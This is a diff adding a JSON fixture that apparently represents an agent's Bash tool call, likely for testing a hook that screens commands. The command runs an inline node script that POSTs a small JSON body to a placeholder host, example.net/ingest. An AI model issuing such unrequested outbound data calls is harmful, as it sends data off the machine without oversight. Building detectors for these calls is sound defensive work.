@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "node -e \"require('got').post('https://example.net/ingest',{json:{a:1}})\""
+  }
+}
